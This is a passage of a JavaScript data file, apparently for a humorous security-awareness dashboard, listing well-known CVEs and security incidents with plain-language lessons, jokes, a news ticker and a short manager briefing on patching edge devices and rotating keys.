     why:"Mass-exploited in 2025. Attackers stole machine keys, so patching alone did not evict them.",
     roast:"Where documents go to collaborate, and attackers go to collaborate too.",
     action:"Patch, rotate ASP.NET machine keys, restart IIS, then hunt for web shells.",
     hug:"Rotating machine keys counts as a workout."},
    {id:"CVE-2024-3400", nick:"GlobalProtect injection", st:"KEV LISTED", kev:true, sev:"critical", product:"Palo Alto PAN-OS", type:"Unauthenticated command injection",
     why:"A firewall bug giving root on the edge device: the classic 'way in' pattern of the last few years.",
     roast:"The firewall was the front door. Specifically, it was the doorbell.",
     action:"Upgrade to a fixed hotfix and check the device for compromise artifacts.",
     hug:"Edge devices are hard. You're doing great."}
  ],
  hof: [
    {era:"classic", year:2014, id:"CVE-2014-0160", nick:"Heartbleed", feel:"existential", product:"OpenSSL", sev:"high",
     lesson:"Memory over-reads can leak secrets like private keys. Patching wasn't enough: certificates had to be reissued.",
     roast:"The first bug with its own logo and website. Proved a vulnerability needs branding to get patched.", hug:"You re-issued every certificate on the internet. Legend."},
    {era:"classic", year:2014, id:"CVE-2014-6271", nick:"Shellshock", feel:"betrayed by bash", product:"GNU Bash", sev:"critical",
     lesson:"Environment variables passed to bash (e.g. via CGI) could carry commands. Old code paths hide old bugs.",
     roast:"Bash had quietly been doing this since 1989. It just didn't think anyone would ask.", hug:"Grepping every CGI script you own is valid cardio."},
    {era:"classic", year:2017, id:"CVE-2017-0144", nick:"EternalBlue", feel:"WannaCried", product:"SMBv1", sev:"high",
     lesson:"A wormable SMB flaw powered WannaCry and NotPetya. Lesson: kill legacy protocols, block SMB at the edge.",
     roast:"SMBv1: retired in theory, still employed in practice.", hug:"Every disabled SMBv1 server is a small act of love."},
    {era:"modern", year:2020, id:"CVE-2020-1472", nick:"Zerologon", feel:"domain admin, apparently", product:"Netlogon", sev:"critical",
     lesson:"A crypto flaw let an attacker on the network take over a domain controller. Patch DCs first, always.",
     roast:"The password was all zeros. The access was all access.", hug:"Your DCs are patched now. Go drink some water."},
    {era:"modern", year:2021, id:"CVE-2021-26855", nick:"ProxyLogon", feel:"aged 5 years", product:"Exchange Server", sev:"critical",
     lesson:"Internet-facing on-prem Exchange was mass-exploited and web shells were everywhere. Patch + hunt, not patch alone.",
     roast:"Exchange admins aged five years in one week. The web shells were thriving, though.", hug:"If you survived March 2021, you can survive this shift."},
    {era:"modern", year:2021, id:"CVE-2021-34527", nick:"PrintNightmare", feel:"haunted", product:"Windows Print Spooler", sev:"high",
     lesson:"The spooler allowed remote code execution as SYSTEM. Disable services you don't need, especially on DCs.",
     roast:"The print spooler: the gift that keeps on spooling.", hug:"Disabling the spooler on DCs is self-care."},
    {era:"modern", year:2021, id:"CVE-2021-44228", nick:"Log4Shell", feel:"Christmas cancelled", product:"Apache Log4j", sev:"critical",
     lesson:"Logging an attacker-controlled string triggered remote code loading. You can't patch what you don't know you have: SBOMs matter.",
     roast:"A logging library logged everyone out of their December.", hug:"You found Log4j in places it shouldn't exist. That's real skill."},
    {era:"modern", year:2022, id:"CVE-2022-30190", nick:"Follina", feel:"troubleshot", product:"Windows MSDT", sev:"high",
     lesson:"A document could launch the MSDT troubleshooter to run code, even without macros. Watch Office spawning odd children.",
     roast:"A Word doc launched the troubleshooter. The troubleshooter was the trouble.", hug:"Not every Office alert is your fault. Most, but not every."},
    {era:"modern", year:2023, id:"CVE-2023-34362", nick:"MOVEit", feel:"transferred", product:"MOVEit Transfer", sev:"critical",
     lesson:"One SQL injection in a file-transfer app led to mass data theft across thousands of organisations. Third-party risk is your risk.",
     roast:"Managed file transfer did exactly what it promised: it transferred the files. To someone else.", hug:"Vendor breaches aren't your fault. The paperwork, sadly, is your job."},
    {era:"modern", year:2023, id:"CVE-2023-4966", nick:"Citrix Bleed", feel:"session-less", product:"NetScaler ADC/Gateway", sev:"critical",
     lesson:"Leaked session tokens let attackers skip MFA. After patching, you must kill active sessions too.",
     roast:"Session tokens, now available to everyone. Very inclusive.", hug:"Killing every session was the right call. Ignore the angry emails."},
    {era:"recent", year:2024, id:"CVE-2024-3094", nick:"XZ Utils backdoor", feel:"trust issues", product:"xz / liblzma", sev:"critical",
     lesson:"A multi-year social-engineering takeover of an open-source project. Caught because SSH logins were ~500ms slower.",
     roast:"Foiled because one engineer thought SSH felt slow. Never ignore 'feels slow'.", hug:"Never apologise for investigating something that 'just feels off'."},
    {era:"recent", year:2024, id:"CVE-2024-6387", nick:"regreSSHion", feel:"déjà vu", product:"OpenSSH", sev:"high",
     lesson:"A regression of a 2006 bug (CVE-2006-5051). Regression tests are security controls.",
     roast:"A bug from 2006 came back for an encore. Nobody requested an encore.", hug:"Patching sshd fleet-wide? You're basically on a world tour."}
  ],
  history: [
    {md:"11-02", year:1988, t:"Morris worm", d:"One of the first internet worms. A grad student's experiment slowed a large part of the early internet."},
    {md:"05-04", year:2000, t:"ILOVEYOU", d:"A love-letter VBS email worm spread worldwide. People really wanted to be loved."},
    {md:"04-07", year:2014, t:"Heartbleed disclosed", d:"OpenSSL memory leak goes public. The era of bugs with logos begins."},
    {md:"09-24", year:2014, t:"Shellshock disclosed", d:"Bash environment-variable command injection. CGI servers everywhere sweat."},
    {md:"05-12", year:2017, t:"WannaCry outbreak", d:"Ransomware worm using EternalBlue hits hospitals and companies worldwide. A kill-switch domain slowed it."},
    {md:"06-27", year:2017, t:"NotPetya", d:"Destructive 'ransomware' spreads via a poisoned software update. Billions in damage."},
    {md:"09-07", year:2017, t:"Equifax breach announced", d:"An unpatched Apache Struts flaw led to one of the largest data breaches of personal data."},
    {md:"12-13", year:2020, t:"SolarWinds / SUNBURST", d:"Supply-chain compromise of Orion updates becomes public. 'Trust the update' gets complicated."},
    {md:"05-07", year:2021, t:"Colonial Pipeline", d:"Ransomware forces a major US fuel pipeline to shut down operations."},
    {md:"07-02", year:2021, t:"Kaseya VSA", d:"Ransomware pushed through an MSP tool reaches many downstream businesses at once."},
    {md:"12-09", year:2021, t:"Log4Shell goes public", d:"The holiday season that wasn't. JNDI enters every analyst's vocabulary."},
    {md:"05-31", year:2023, t:"MOVEit disclosed", d:"Mass exploitation of MOVEit Transfer by a ransomware/extortion group."},
    {md:"03-29", year:2024, t:"XZ backdoor found", d:"A backdoor in xz/liblzma is caught days before reaching stable distros."},
    {md:"07-01", year:2024, t:"regreSSHion", d:"OpenSSH signal-handler race condition (a returning 2006 bug) disclosed."},
    {md:"07-19", year:2024, t:"Global endpoint outage", d:"A faulty security-agent content update crashes millions of Windows machines. Change control becomes a security topic."}
  ],
  ticker: [
    ["KEV","{kev} new entries added to CISA KEV this week. Weather: as advertised."],
    ["2026","Linux 'Copy Fail' (CVE-2026-31431) is the most researched CVE of the year. Your kernel has entered the chat."],
    ["BOTNET","marimo pre-auth RCE (CVE-2026-39987): botnets moved in before the data scientists moved out."],
    ["EMAIL","Cisco Secure Email Gateway CVE-2026-76461 reported exploited: the gateway got phished, in a way."],
    ["MOOD","Edge devices remain the favourite way in. The edge is not a vibe, it's a liability."],
    ["PSA","It's DNS. It's always DNS. Except when it's the printer."],
    ["TIP","Hydrate. The SIEM will still be screaming in five minutes."]
  ],
  brew: [
    {t:"Email gateways are targets, not just shields", take:"An actively exploited email-gateway bug means the box that filters attacks can become the attacker's foothold. Check your gateway's version and its outbound connections today.", lol:"Who filters the filter? (You. It's you.)"},
    {t:"Notebook servers are the new forgotten Jenkins", take:"Exposed data-science tools like marimo are being hit by botnets. Ask your data team what's running on public IPs.", lol:"'It's just a notebook' — famous last words, 2026 edition."},
    {t:"Patch + hunt, not patch alone", take:"For anything where keys or sessions could be stolen (SharePoint, Citrix-style bugs), patching doesn't evict an attacker. Rotate secrets and hunt.", lol:"Patching a breached box is like changing the lock while the burglar is still in the kitchen."}
  ],
  manager: {
    theme:"Edge and gateway devices",
    bullets:[
      "Theme of the week: attackers keep targeting internet-facing appliances (email gateways, VPNs, firewalls).",
      "Ask the team: do we know every internet-facing appliance we own, and its current version?",
      "Ask the team: for exploited bugs, do we rotate keys/sessions after patching, not just patch?",
      "Metric to watch: time from a KEV listing to patched on our edge devices."],
    board:"Attackers are focusing on the devices that sit on our perimeter. We are tracking them and prioritising those patches."
  }
};
